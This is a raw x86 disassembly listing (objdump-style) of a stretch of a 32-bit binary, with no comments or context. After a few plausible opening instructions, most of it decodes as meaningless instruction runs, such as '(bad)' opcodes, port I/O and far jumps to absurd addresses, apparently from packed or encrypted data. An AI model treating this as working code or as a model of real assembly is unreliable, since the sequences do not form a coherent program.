  40a22e:	mov    esi,0xffcd8d1e
  40a233:	mov    ebx,esi
  40a235:	sub    ebx,edi
  40a237:	add    DWORD PTR [eax],ebx
  40a239:	mov    eax,DWORD PTR [ebp-0x4]
  40a23c:	mov    edi,DWORD PTR [ebp-0x8]
  40a23f:	jmp    0x40c58e
  40a244:	pusha  
  40a245:	sub    DWORD PTR [ebx-0x11],eax
  40a248:	repz ja 0x40a1fb
  40a24b:	xchg   ebx,eax
  40a24c:	cli    
  40a24d:	adc    bl,ah
  40a24f:	je     0x40a1fa
  40a251:	cmc    
  40a252:	rcr    DWORD PTR [esi+0x7c7c05d0],1
  40a258:	dec    esi
  40a259:	pop    edi
  40a25a:	jl     0x40a2d8
  40a25c:	ss inc ebx
  40a25e:	out    0x73,al
  40a260:	lahf   
  40a261:	or     eax,0xcfdaac69
  40a266:	je     0x40a216
  40a268:	pop    ss
  40a269:	out    0xac,al
  40a26b:	xor    dh,BYTE PTR [edi+0x50]
  40a26e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a26f:	and    eax,0xcae2457d
  40a274:	xchg   ecx,eax
  40a275:	jmp    0xfbbb:0x4c5bc00b
  40a27c:	mov    ah,0x64
  40a27e:	div    BYTE PTR [ebx-0xb]
  40a281:	jmp    DWORD PTR [edi+edi*1+0x252d3616]
  40a288:	and    DWORD PTR [eax+0x1e],eax
  40a28b:	dec    esi
  40a28c:	lea    edx,[edx+0x73870346]
  40a292:	ficomp WORD PTR [ecx-0x61]
  40a295:	and    dl,BYTE PTR [ebp-0x61]
  40a298:	sub    BYTE PTR [edx+0x3ee2373e],cl
  40a29e:	js     0x40a28d
  40a2a0:	jge    0x40a240
  40a2a2:	mov    ebp,0xaaee4804
  40a2a7:	ja     0x40a293
  40a2a9:	inc    esi
  40a2aa:	add    al,al
  40a2ac:	test   eax,0xc3ada7d2
  40a2b1:	aam    0x4c
  40a2b3:	xor    BYTE PTR [ebx],ch
  40a2b5:	sub    BYTE PTR [esi],dl
  40a2b7:	(bad)  
  40a2b8:	jnp    0x40a2c6
  40a2ba:	push   ebp
  40a2bb:	shl    DWORD PTR [ebx-0x17],cl
  40a2be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2bf:	push   cs
  40a2c0:	pop    ecx
  40a2c1:	mov    BYTE PTR [edx-0x26],cl
  40a2c4:	mov    cl,0xe1
  40a2c6:	add    al,0x26
  40a2c8:	push   edx
  40a2c9:	in     eax,dx
  40a2ca:	test   DWORD PTR [ebp+0x7d44183f],esp
  40a2d0:	mov    ebx,?
  40a2d2:	sub    bh,BYTE PTR [ebp+0x2d3ad0f9]
  40a2d8:	inc    esi
  40a2d9:	add    eax,DWORD PTR [edi]
  40a2db:	out    dx,eax
  40a2dc:	je     0x40a2dc
  40a2de:	jne    0x40a2c2
  40a2e0:	mov    al,0x1a
  40a2e2:	fwait
  40a2e3:	cmp    eax,0xca6572e6
  40a2e8:	dec    ebx
  40a2e9:	repnz and al,dh
  40a2ec:	std    
  40a2ed:	mov    esp,0xee36e4fd
  40a2f2:	jae    0x40a2aa
  40a2f4:	mov    bh,0x3d
  40a2f6:	sar    DWORD PTR [ebx-0xaf05f2c],0x4f
  40a2fd:	and    BYTE PTR [eax+0x75d34f68],al
  40a303:	mov    al,0xa0
  40a305:	adc    al,0x29
  40a307:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a308:	xchg   esp,eax
  40a309:	xchg   DWORD PTR [ebp-0x7c],ebx
  40a30c:	call   0xdab6323a
  40a311:	loopne 0x40a36a
  40a313:	into   
  40a314:	push   ecx
  40a315:	inc    edi
  40a316:	enter  0x11f,0xb7
  40a31a:	shl    DWORD PTR [ecx],0xab
  40a31d:	data16 test BYTE PTR [edx],bh
  40a320:	inc    ebx
  40a321:	xchg   esp,edi
  40a323:	test   DWORD PTR [edi-0x54],0x4cd32ce6
  40a32a:	out    dx,eax
  40a32b:	xor    ah,ch
  40a32d:	xchg   ebp,eax
  40a32e:	mov    dl,0xf0
  40a330:	(bad)  
  40a332:	mov    ah,0xb1
  40a334:	test   al,0x7f
  40a336:	scas   al,BYTE PTR es:[edi]
  40a337:	push   ecx
  40a338:	inc    edi
  40a339:	add    al,0x64
  40a33b:	mov    ecx,0xab287a9c
  40a340:	add    BYTE PTR [eax-0x2e],0x24
  40a344:	stos   DWORD PTR es:[edi],eax
  40a345:	lock mov cl,0x2b
  40a348:	and    bh,BYTE PTR [ebx-0x836e7e1]
  40a34e:	dec    esi
  40a34f:	inc    ebx
  40a350:	(bad)  
  40a351:	leave  
  40a352:	or     eax,0xf22087ea
  40a357:	xchg   ebx,eax
  40a358:	pop    ecx
  40a359:	or     BYTE PTR [ecx+esi*2+0x15],bl
  40a35d:	mov    al,0x1a
  40a35f:	or     al,0x40
  40a361:	dec    BYTE PTR [edi+ecx*1]
  40a364:	jle    0x40a2ea
  40a366:	rcl    BYTE PTR [edi+0x75],cl
  40a369:	xor    ebx,edx
  40a36b:	pop    ecx
  40a36c:	jne    0x40a392
  40a36e:	push   ebx
  40a36f:	pop    ds
  40a370:	fidivr WORD PTR [esi-0x30c452dc]
  40a376:	sar    BYTE PTR [ebx-0x57],cl
  40a379:	cs pushf 
  40a37b:	data16 mov al,0x8
  40a37e:	inc    eax
  40a37f:	jl     0x40a37e
  40a381:	mul    BYTE PTR [ecx+0x5effc7bf]
  40a387:	nop
  40a388:	stc    
  40a389:	(bad)  
  40a38a:	stos   BYTE PTR es:[edi],al
  40a38b:	cmp    ebp,ebp
  40a38d:	int3   
  40a38e:	neg    esp
  40a390:	or     al,0xa2
  40a392:	in     al,dx
  40a393:	dec    DWORD PTR [edi+ebx*4-0x755898a1]
  40a39a:	enter  0x3dcc,0xf5
  40a39e:	inc    ebp
  40a39f:	aam    0xf3
  40a3a1:	xchg   esp,eax
  40a3a2:	or     al,0x91
  40a3a5:	adc    bh,dl
  40a3a7:	inc    ebp
  40a3a8:	(bad)  
  40a3a9:	mov    esp,0x54087f70
  40a3ae:	jns    0x40a414
  40a3b0:	adc    ch,BYTE PTR [edi-0xb60b4a6]
  40a3b6:	shl    BYTE PTR [edx],0x47
  40a3b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3ba:	jg     0x40a3ca
  40a3bc:	mov    dh,0x91
  40a3be:	jmp    0x40a41d
  40a3c0:	xchg   bl,dl
  40a3c2:	or     DWORD PTR [eax-0x536332b8],esp
  40a3c8:	dec    edx
  40a3c9:	pop    ss
  40a3ca:	push   edx
  40a3cb:	jno    0x40a438
  40a3cd:	imul   ebp,DWORD PTR [ebx+0x38],0x3f46651b
  40a3d4:	iret   
  40a3d5:	test   al,0x72
  40a3d7:	and    DWORD PTR [ebp+0xd],0x50a6058a
  40a3de:	ret    
  40a3df:	inc    eax
  40a3e0:	in     al,dx
  40a3e1:	and    ah,BYTE PTR [esi+0x5d]
  40a3e4:	dec    esi
  40a3e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3e6:	shr    ecx,cl
  40a3e8:	fs js  0x40a46a
  40a3eb:	and    eax,0x4717c96b
  40a3f0:	gs loope 0x40a3eb
  40a3f3:	in     eax,0x2f
  40a3f5:	jge    0x40a3ee
  40a3f7:	jge    0x40a3ad
  40a3f9:	mov    edi,0x3371255e
  40a3fe:	arpl   WORD PTR [edi],di
  40a400:	rcr    DWORD PTR [esi],1
  40a402:	xchg   edi,eax
  40a403:	add    eax,0x4d3c6c13
  40a408:	and    al,0x1f
  40a40a:	int3   
  40a40b:	mov    esi,0x9f4f889
  40a410:	sar    DWORD PTR [ecx],0x61
  40a413:	xor    ch,bl
  40a415:	mov    edx,0x9f1c3784
  40a41a:	xchg   ebx,eax
  40a41b:	ret    0x5208
  40a41e:	push   edx
  40a41f:	mov    esi,0x1e1be809
  40a424:	jmp    0x40a3d5
  40a426:	pushf  
  40a427:	inc    ebp
  40a428:	xchg   cx,ax
  40a42a:	jo     0x40a3cf
  40a42c:	loope  0x40a49f
  40a42e:	outs   dx,DWORD PTR ds:[esi]
  40a42f:	imul   eax,DWORD PTR [ecx+edx*1],0xa7eca489
  40a436:	(bad)  
  40a438:	pop    edi
  40a439:	(bad)  
  40a43a:	and    eax,0x22b5ea17
  40a43f:	push   ecx
  40a440:	les    esi,FWORD PTR [ecx]
  40a442:	out    0x25,al
  40a444:	jno    0x40a488
  40a446:	push   ebx
  40a447:	hlt    
  40a448:	jae    0x40a3d8
  40a44a:	pop    esi
  40a44b:	pop    ebx
  40a44c:	xor    DWORD PTR ds:0xd943c21,ebp
  40a452:	jne    0x40a4a0
  40a454:	sub    DWORD PTR [esi+0x422c266d],ebx
  40a45a:	jb     0x40a40e
  40a45c:	mov    esi,eax
  40a45e:	add    ecx,ecx
  40a460:	cmp    dh,BYTE PTR ss:[esi+edi*2]
  40a464:	jbe    0x40a43f
  40a466:	xor    DWORD PTR [ecx+0x8b468b3],esi
  40a46c:	scas   eax,DWORD PTR es:[edi]
  40a46d:	jg     0x40a4b9
  40a46f:	xchg   BYTE PTR [edi],ch
  40a471:	xchg   BYTE PTR [eax+0x9],bh
  40a474:	cmp    DWORD PTR [esi-0x62a755e9],0xffffff95
  40a47b:	xchg   BYTE PTR [edi],dl
  40a47d:	out    dx,al
  40a47e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a47f:	mov    al,0x30
  40a481:	pop    edx
  40a482:	pop    eax
  40a483:	clc    
  40a484:	ror    DWORD PTR [edx],cl
  40a486:	xchg   esi,eax
  40a487:	scas   al,BYTE PTR es:[edi]
  40a488:	jne    0x40a4c0
  40a48a:	sub    dh,BYTE PTR [esp+ebx*4]
  40a48d:	dec    ebx
  40a48e:	or     BYTE PTR [ecx+0x12],bh
  40a491:	test   BYTE PTR [esi],ah
  40a493:	ins    DWORD PTR es:[edi],dx
  40a494:	adc    ebx,DWORD PTR [eax-0x56]
  40a497:	repnz push es
  40a499:	xor    edi,DWORD PTR [edi]
  40a49b:	mov    ecx,0xef23c699
  40a4a0:	mov    edi,DWORD PTR [eax]
  40a4a2:	retf   
  40a4a3:	iret   
  40a4a4:	push   esp
  40a4a5:	push   ds
  40a4a6:	push   esi
  40a4a7:	or     cl,bh
  40a4a9:	in     al,dx
  40a4aa:	std    
  40a4ab:	jmp    0x3032:0x113365f5
  40a4b2:	(bad)  
  40a4b3:	jmp    0xa396:0xfa54d297
  40a4ba:	scas   eax,DWORD PTR es:[edi]
  40a4bb:	call   DWORD PTR ds:0xd7e6e34c
  40a4c1:	xor    al,0x68
  40a4c3:	pop    esi
  40a4c4:	mul    DWORD PTR [ecx]
  40a4c6:	pop    esi
  40a4c7:	fdivr  QWORD PTR [edx+0x55]
  40a4ca:	or     DWORD PTR [edx+0x3e49ad19],esi
  40a4d0:	mov    esp,0x5cea4fad
  40a4d5:	(bad)  
  40a4d6:	call   0xe827:0xcabd0915
  40a4dd:	dec    ecx
  40a4de:	xor    edi,DWORD PTR [ebx-0x44]
  40a4e1:	mov    ds:0x9d346c6d,eax
  40a4e6:	push   es
  40a4e7:	test   DWORD PTR ds:0xcacf2d03,0x85cdcd71
  40a4f1:	mov    ds:0x8937ec03,al
  40a4f6:	fisubr DWORD PTR [edx+edi*1]
  40a4f9:	cmc    
  40a4fa:	(bad)  
  40a4fb:	sub    eax,0x333a17f7
  40a500:	pusha  
  40a501:	inc    ebx
  40a502:	ins    BYTE PTR es:[edi],dx
  40a503:	scas   al,BYTE PTR es:[edi]
  40a504:	sbb    BYTE PTR [edi+esi*1],ch
  40a507:	ror    esi,cl
  40a509:	arpl   WORD PTR [esi+0x16],di
  40a50c:	gs std 
  40a50e:	js     0x40a4ed
  40a510:	pop    edi
  40a511:	push   ds
  40a512:	push   esi
  40a513:	test   eax,0xbb3eedc
  40a518:	or     BYTE PTR ds:0xd84a7cd,bl
  40a51e:	mov    ch,0x7a
  40a520:	bound  esp,QWORD PTR ss:[eax+edi*8-0x5b]
  40a525:	mov    ebp,ebp
  40a527:	call   0xaf9f23d3
  40a52c:	in     eax,dx
  40a52d:	add    cl,ah
  40a52f:	aam    0x7b
  40a531:	adc    DWORD PTR [esi-0x4b11f4f2],ecx
  40a537:	pushf  
  40a538:	out    0x75,eax
  40a53a:	cmp    eax,DWORD PTR [esi-0x138b03c3]
  40a540:	add    DWORD PTR [ebx+eax*1],esi
  40a543:	lock mov al,ds:0xcf45b8fe
  40a549:	(bad)  
  40a54a:	daa    
  40a54b:	xchg   edi,eax
  40a54c:	out    0xdf,eax
  40a54e:	adc    ebp,ebx
  40a550:	popa   
  40a551:	iret   
  40a552:	pop    es
  40a553:	stos   DWORD PTR es:[edi],eax
  40a554:	hlt    
  40a555:	cs sbb eax,0xaf4ba9f4
  40a55b:	in     al,dx
  40a55c:	push   ebp
  40a55d:	out    0x4d,al
  40a55f:	(bad)  
  40a560:	sub    DWORD PTR [edx+0x22a4b125],ebx
  40a566:	clc    
  40a567:	retf   0x489f
  40a56a:	adc    ebp,ebx
  40a56c:	retf   0x1b64
  40a56f:	inc    esi
  40a570:	popf   
  40a571:	aam    0x34
  40a573:	and    al,0x85
  40a575:	scas   al,BYTE PTR es:[edi]
  40a576:	sub    BYTE PTR [esi],ah
  40a578:	iret   
  40a579:	dec    esp
  40a57a:	or     esi,DWORD PTR [ebx-0x61]
  40a57d:	test   al,0x49
  40a57f:	cs (bad) 
  40a581:	cmp    al,0x5
  40a583:	rcl    BYTE PTR [edi],0x0
  40a586:	(bad)  
  40a587:	repnz cld 
  40a589:	ret    
  40a58a:	mov    ecx,0xb451677d
  40a58f:	repnz mov al,0x4
  40a592:	jmp    0x7dba:0xc75b5f14
  40a599:	jb     0x40a603
  40a59b:	nop
  40a59c:	stos   BYTE PTR es:[edi],al
  40a59d:	pop    ebp
  40a59e:	cwde   
  40a59f:	sub    al,0x50
  40a5a1:	xchg   ecx,eax
  40a5a2:	(bad)  
  40a5a3:	mov    dl,0xed
  40a5a5:	inc    edi
  40a5a6:	dec    ebp
  40a5a7:	adc    BYTE PTR [edx+0x73],0xa4
  40a5ab:	mov    DWORD PTR [edx-0x1f8876bb],ecx
  40a5b1:	jl     0x40a629
  40a5b3:	(bad)  
  40a5b4:	shr    BYTE PTR [edx],1
  40a5b6:	(bad)  
  40a5b7:	lea    edi,[esi+0x65]
  40a5ba:	enter  0xb63,0x86
  40a5be:	lods   eax,DWORD PTR ds:[esi]
  40a5bf:	fstp   st(3)
  40a5c1:	xchg   ebp,eax
  40a5c2:	jl     0x40a5e0
  40a5c4:	sub    BYTE PTR [esi],dh
  40a5c6:	stos   DWORD PTR es:[edi],eax
  40a5c7:	int3   
  40a5c8:	pop    ds
  40a5c9:	mov    bl,0x3d
  40a5cb:	lods   eax,DWORD PTR ds:[esi]
  40a5cc:	jle    0x40a564
  40a5ce:	xchg   BYTE PTR [esi+0x48],ah
  40a5d1:	icebp  
  40a5d2:	adc    eax,0x50fd8b7e
  40a5d7:	pop    edi
  40a5d8:	fdivr  DWORD PTR [ecx+0x13]
  40a5db:	je     0x40a56b
  40a5dd:	dec    eax
  40a5de:	mov    dl,0x27
  40a5e0:	or     edi,ecx
  40a5e2:	pop    ecx
  40a5e3:	imul   DWORD PTR [esi*4-0x97c5368]
  40a5ea:	jecxz  0x40a627
  40a5ec:	push   esp
  40a5ed:	or     BYTE PTR [esi],al
  40a5ef:	add    ebx,DWORD PTR [ebp+edx*4-0x30]
  40a5f3:	xchg   eax,eax
  40a5f5:	outs   dx,BYTE PTR ds:[esi]
  40a5f7:	jl     0x40a638
  40a5f9:	call   0x7b13f4c
  40a5fe:	jae    0x40a598
  40a600:	stos   DWORD PTR es:[edi],eax
  40a601:	out    0x4c,al
  40a603:	mov    eax,ds:0xdb8c253c
  40a608:	push   esi
  40a609:	inc    edx
  40a60a:	scas   eax,DWORD PTR es:[edi]
  40a60b:	dec    edx
  40a60c:	out    dx,eax
  40a60d:	adc    edi,DWORD PTR [eax]
  40a60f:	mov    dh,0x83
  40a611:	cdq    
  40a612:	xchg   BYTE PTR [esi+0x6a],cl
  40a615:	dec    edi
  40a616:	pusha  
  40a617:	iret   
  40a618:	les    ebx,FWORD PTR es:[edx+0x22]
  40a61c:	xchg   esp,eax
  40a61d:	mov    bl,0xeb
  40a61f:	or     edx,DWORD PTR [edi]
  40a621:	sahf   
  40a622:	test   BYTE PTR [edx-0x4],ah
  40a625:	sbb    DWORD PTR [esi-0x58],esi
  40a628:	push   ebx
  40a629:	hlt    
  40a62a:	and    ecx,DWORD PTR [esi+0x60effb81]
  40a630:	cdq    
  40a631:	mov    cl,0x41
  40a633:	mov    ds:0x9089089e,eax
  40a638:	les    esi,FWORD PTR [edx-0x5a]
  40a63b:	inc    ebx
  40a63c:	fcos   
  40a63e:	fcmovnu st,st(2)
  40a640:	and    al,dh
  40a642:	ret    0x2b83
  40a645:	mov    al,0xdc
  40a647:	cmp    BYTE PTR [ebp+0x7df40688],dl
  40a64d:	adc    eax,0xcd31797
  40a652:	push   ebp
  40a653:	imul   eax,edi,0x30857043
  40a659:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40a65b:	push   ds
  40a65c:	push   ecx
  40a65d:	sti    
  40a65e:	shl    BYTE PTR [ebx+0x30de19c3],0x2a
  40a665:	sbb    al,0x1
  40a667:	cmp    BYTE PTR [edi],ch
  40a669:	clc    
  40a66a:	lock jmp 0x75a068a8
  40a670:	push   ds
  40a671:	shl    DWORD PTR [edi-0x32],0xd6
  40a675:	test   DWORD PTR [edi],ebp
  40a677:	jl     0x40a6dd
  40a679:	add    BYTE PTR [ebp-0x29],al
  40a67c:	mov    gs,WORD PTR [eax-0x6f5ae57]
  40a682:	repnz mov edx,0x8ae77bdf
  40a688:	mov    ds:0x49adb173,al
  40a68d:	into   
  40a68e:	push   eax
  40a68f:	add    ebp,ebp
  40a691:	mov    BYTE PTR [edi],bh
  40a693:	in     al,0x5e
  40a695:	pop    ss
  40a696:	adc    ch,dh
  40a698:	shr    DWORD PTR [ecx],0x83
  40a69b:	pushf  
  40a69c:	dec    eax
  40a69d:	push   0x30a687c8
  40a6a2:	retf   0x90ea
  40a6a5:	es jmp 0x40a631
  40a6a8:	add    eax,esi
  40a6aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a6ab:	adc    eax,0xb146f500
  40a6b0:	pushf  
  40a6b1:	lock jmp FWORD PTR [eax]
  40a6b4:	cmp    DWORD PTR [ebx-0x5bdb4e61],ecx
  40a6ba:	push   esp
  40a6bb:	test   eax,0x39acf30
  40a6c0:	scas   al,BYTE PTR es:[edi]
  40a6c1:	xchg   ecx,eax
  40a6c2:	cmp    edi,esp
  40a6c4:	and    al,0x4a
  40a6c6:	dec    edi
  40a6c7:	push   esp
  40a6c8:	and    DWORD PTR [edi],eax
  40a6ca:	add    al,0xc9
  40a6cc:	mov    dh,0xd0
  40a6ce:	sbb    ecx,0xe44dadf7
  40a6d4:	jmp    0x5cec89ab
  40a6d9:	popf   
  40a6da:	stos   DWORD PTR es:[edi],eax
  40a6db:	in     eax,dx
  40a6dc:	scas   al,BYTE PTR es:[edi]
  40a6dd:	test   al,0xea
  40a6df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6e0:	sub    eax,0xd93c8e6d
  40a6e5:	(bad)  
  40a6e6:	add    eax,0x66587d9
  40a6eb:	std    
  40a6ec:	push   edi
  40a6ed:	xor    eax,0x9c349c44
  40a6f2:	xchg   ebp,eax
  40a6f3:	push   esi
  40a6f4:	repz ret 
  40a6f6:	add    bh,BYTE PTR [ebp+0x7049862e]
  40a6fc:	sub    BYTE PTR [ebp+0x32],bh
  40a6ff:	dec    edx
  40a700:	loope  0x40a6c9
  40a702:	rcl    BYTE PTR [ecx],1
  40a704:	js     0x40a74c
  40a706:	repz mov edi,DWORD PTR [edi+0x17041d36]
  40a70d:	adc    edx,DWORD PTR [eax+0x5d79a64a]
  40a713:	dec    ebx
  40a714:	xchg   edx,eax
  40a715:	mov    ebx,0xc789f7d4
  40a71a:	pusha  
  40a71b:	jg     0x40a707
  40a71d:	add    eax,0xfcac8a1f
  40a722:	jbe    0x40a731
  40a724:	test   BYTE PTR [ecx+0x1b],ah
  40a727:	xchg   al,dl
  40a729:	xor    BYTE PTR [edx+ebx*1+0x31],al
  40a72d:	int    0x2e
  40a72f:	outs   dx,DWORD PTR ds:[esi]
  40a730:	(bad)  
  40a731:	push   ds
  40a732:	push   ecx
  40a733:	cwde   
  40a734:	pop    es
  40a735:	inc    edx
  40a736:	mov    cl,0x5b
  40a738:	jg     0x40a723
  40a73a:	stc    
  40a73b:	xlat   BYTE PTR ds:[ebx]
  40a73c:	into   
  40a73d:	(bad)  
  40a73e:	es jne 0x40a6d4
  40a741:	rcr    BYTE PTR [esp+edi*4],1
  40a744:	sbb    eax,0x9bb34335
  40a749:	push   ecx
  40a74a:	retf   
  40a74b:	popa   
  40a74c:	iret   
  40a74d:	lock cmp al,0x7
  40a750:	push   ebx
  40a751:	out    0xfd,eax
  40a753:	xor    eax,0x6b511b3
  40a758:	div    BYTE PTR [eax]
  40a75a:	hlt    
  40a75b:	(bad)  
  40a75c:	fisubr WORD PTR [ebp-0x65]
  40a75f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a760:	retf   0xc5e1
  40a763:	mov    esi,0xd096281f
  40a768:	cli    
  40a769:	iret   
  40a76a:	or     bh,bh
  40a76c:	push   edi
  40a76d:	in     al,0x30
  40a76f:	adc    al,0x56
  40a771:	loope  0x40a74c
  40a773:	push   esi
  40a774:	xchg   esi,eax
  40a775:	out    dx,eax
  40a776:	pop    es
  40a777:	cmpxchg BYTE PTR [esi+0x4f90df3a],dh
  40a77e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a77f:	lea    ebp,[esp+eax*4+0x3b971c5e]
  40a786:	jno    0x40a73d
  40a788:	jb     0x40a7ef
  40a78a:	inc    edx
  40a78b:	ror    DWORD PTR [ecx-0x5a80fbc],cl
  40a791:	stos   BYTE PTR es:[edi],al
  40a792:	sti    
  40a793:	mov    eax,0x8a031edf
  40a798:	mov    DWORD PTR [esi+eax*1+0xb],esi
  40a79c:	lahf   
  40a79d:	cdq    
  40a79e:	popf   
  40a79f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7a0:	mov    dh,0x64
  40a7a2:	aaa    
  40a7a3:	(bad)  
  40a7a4:	std    
  40a7a5:	loope  0x40a7c3
  40a7a7:	lahf   
  40a7a8:	lock in eax,0x10
  40a7ab:	lahf   
  40a7ac:	and    al,0xec
  40a7ae:	lock aas 
  40a7b0:	xchg   DWORD PTR [ebx+eax*2+0x1d],ebx
  40a7b4:	adc    BYTE PTR [ecx],0xbb
  40a7b7:	push   ds
  40a7b8:	push   0xffffffb5
  40a7ba:	test   eax,0x28b9459f
  40a7bf:	dec    esp
  40a7c0:	jae    0x40a797
  40a7c2:	mov    al,0x8c
  40a7c4:	jnp    0x40a7f8
  40a7c6:	imul   BYTE PTR [esi]
  40a7c8:	pop    edi
  40a7c9:	and    dl,BYTE PTR [ecx-0x368862e1]
  40a7cf:	adc    DWORD PTR [ebx],esi
  40a7d1:	(bad)  
  40a7d2:	adc    ch,BYTE PTR [esi]
  40a7d4:	jbe    0x40a794
  40a7d6:	dec    edi
  40a7d7:	push   DWORD PTR [edx+0x11b403c1]
  40a7dd:	pop    ss
  40a7de:	xchg   ecx,eax
  40a7df:	or     DWORD PTR [eax-0x5f],ecx
  40a7e2:	fcomp  QWORD PTR [esi]
  40a7e4:	xchg   ecx,eax
  40a7e5:	loop   0x40a7a0
  40a7e7:	sub    DWORD PTR [ebp-0x4e30a3db],edi
  40a7ed:	mov    eax,ds:0xf3d837fc
  40a7f2:	sar    esp,0xcb
  40a7f5:	cmp    eax,0x8363cd4c
  40a7fa:	push   esi
  40a7fb:	push   0xfe3a80b5
  40a800:	mov    esp,0x69ea1d1f
  40a805:	xlat   BYTE PTR cs:[ebx]
  40a807:	cmp    ebx,DWORD PTR [esi-0x2e290ca2]
  40a80d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a80e:	sbb    ebp,DWORD PTR [ebx+ebp*1-0x7499885e]
  40a815:	scas   al,BYTE PTR es:[edi]
  40a816:	sub    al,0x89
  40a818:	add    BYTE PTR [esi],0x55
  40a81b:	test   BYTE PTR [eax-0x3f],0x30
  40a81f:	mov    ebx,0xdfc45f3d
  40a824:	int3   
  40a825:	rcl    BYTE PTR [edi-0x5e745e63],1
  40a82b:	add    al,0xc5
  40a82d:	sub    al,0x18
  40a82f:	or     BYTE PTR [ebp+0x64],ah
  40a832:	and    dh,BYTE PTR [eax-0x678ccace]
  40a838:	cdq    
  40a839:	mov    BYTE PTR [eax-0x7397bc74],bl
  40a83f:	pushf  
  40a840:	inc    ecx
  40a841:	loope  0x40a7e8
  40a843:	mov    ecx,0x700aa3cd
  40a848:	push   ebx
  40a849:	mov    dh,0x45
  40a84b:	cmp    al,0x87
  40a84d:	fadd   DWORD PTR [edi]
  40a84f:	stos   BYTE PTR es:[edi],al
  40a850:	and    bh,ah
  40a852:	mov    ebp,0xc7b8ff4a
  40a857:	in     al,0x8c
  40a859:	inc    ecx
  40a85a:	js     0x40a83b
  40a85c:	mov    eax,0x35fde43c
  40a861:	xchg   esi,eax
  40a862:	add    ebp,DWORD PTR [edx+0x56b779db]
  40a868:	daa    
  40a869:	xchg   esp,eax
  40a86a:	cmp    al,0x5e
  40a86c:	dec    ebp
  40a86d:	les    ebp,FWORD PTR [ebp+0x658fe694]
  40a873:	mov    ?,ebp
  40a875:	(bad)  
  40a876:	iret   
  40a877:	pop    ss
  40a878:	stc    
  40a879:	jmp    0xfaa6ca32
  40a87e:	enter  0x4bb4,0xf1
  40a882:	hlt    
  40a883:	cld    
  40a884:	adc    BYTE PTR [ebx+0xfff8c74],bh
  40a88a:	jge    0x40a8b5
  40a88c:	(bad)  
  40a88d:	das    
  40a88e:	push   eax
  40a88f:	xchg   edx,eax
  40a890:	mov    eax,DWORD PTR [esi]
  40a892:	(bad)  
  40a893:	cld    
  40a894:	lods   al,BYTE PTR ds:[esi]
  40a895:	loopne 0x40a871
  40a897:	sub    al,0x1f
  40a899:	add    bl,dh
  40a89b:	mov    DWORD PTR [ebx+0x27fa5a7],ecx
  40a8a1:	or     BYTE PTR [ecx-0x6f],ch
  40a8a4:	ror    BYTE PTR [eax],0x2
  40a8a7:	test   DWORD PTR [ecx-0x6f13df5e],ebx
  40a8ad:	or     BYTE PTR [edx+edx*8+0x19],al
  40a8b1:	mov    eax,ds:0x4c40a12e
  40a8b6:	leave  
  40a8b7:	inc    ebx
  40a8b8:	inc    eax
  40a8b9:	jl     0x40a8e9
  40a8bb:	into   
  40a8bc:	icebp  
  40a8bd:	in     al,0x1f
  40a8bf:	fmul   QWORD PTR [ecx]
  40a8c1:	out    dx,al
  40a8c2:	cmp    BYTE PTR [eax-0x693ed40c],0x97
  40a8c9:	sbb    BYTE PTR [esi+edi*8],ah
  40a8cc:	dec    edx
  40a8cd:	ins    BYTE PTR es:[edi],dx
  40a8ce:	inc    esi
  40a8cf:	adc    eax,0xa8a2751b
  40a8d4:	xor    ch,dh
  40a8d6:	loope  0x40a8a2
  40a8d8:	cmp    eax,0x8c3bf426
  40a8dd:	dec    DWORD PTR [edi-0x55646a36]
  40a8e3:	mov    bl,0x4
  40a8e5:	iret   
  40a8e6:	es pusha 
  40a8e8:	and    eax,0x1b29e9fe
  40a8ed:	sti    
  40a8ee:	inc    esi
  40a8ef:	jmp    0x4a9e:0xb5eabdb
  40a8f6:	repnz sub BYTE PTR [edi],cl
  40a8f9:	jo     0x40a96a
  40a8fb:	mov    bh,0xc6
  40a8fd:	mov    cl,0xa7
  40a8ff:	loop   0x40a906
  40a901:	pop    DWORD PTR ds:0x5f454028
  40a907:	arpl   WORD PTR fs:[edx],bp
  40a90a:	push   ebp
  40a90b:	outs   dx,DWORD PTR ds:[esi]
  40a90c:	ret    0xc72f
  40a90f:	xchg   edi,eax
  40a910:	mov    eax,ds:0x5284343f
  40a915:	dec    esi
  40a916:	sbb    BYTE PTR [edx+0x66],0x99
  40a91a:	loopne 0x40a936
  40a91c:	jmp    0x40a993
  40a91e:	xlat   BYTE PTR ds:[ebx]
  40a91f:	enter  0xd51c,0x85
  40a923:	or     DWORD PTR [ecx-0x6fa03975],0x93c35011
  40a92d:	(bad)  
  40a92e:	inc    eax
  40a92f:	xchg   ebx,eax
  40a930:	mov    bl,0xee
  40a932:	sub    al,0x70
  40a934:	mov    WORD PTR [eax+0x5cefddbc],es
  40a93a:	mov    dh,0x0
  40a93c:	and    eax,0x5a9a6eb7
  40a941:	push   esp
  40a942:	sti    
  40a943:	fimul  DWORD PTR [edi-0x38]
  40a946:	push   edi
  40a947:	iret   
  40a948:	(bad)  
  40a949:	enter  0x1b9e,0x28
  40a94d:	test   BYTE PTR [edi+0x17],cl
  40a950:	or     eax,0x7ffaaee7
  40a955:	mov    ah,0x97
  40a957:	jmp    0x40a900
  40a959:	adc    eax,0xf261d1f
  40a95e:	push   edi
  40a95f:	mov    ch,0x5
  40a961:	mov    eax,0x5531b77
  40a966:	adc    ah,BYTE PTR [esi-0x9]
  40a969:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a96a:	retf   
  40a96b:	mov    cl,0x9b
  40a96d:	je     0x40a952
  40a96f:	and    ebx,DWORD PTR [ebp-0x18]
  40a972:	or     DWORD PTR ds:0x4e1bd218,edx
  40a978:	scas   al,BYTE PTR es:[edi]
  40a979:	stos   BYTE PTR es:[edi],al
  40a97a:	xchg   ecx,eax
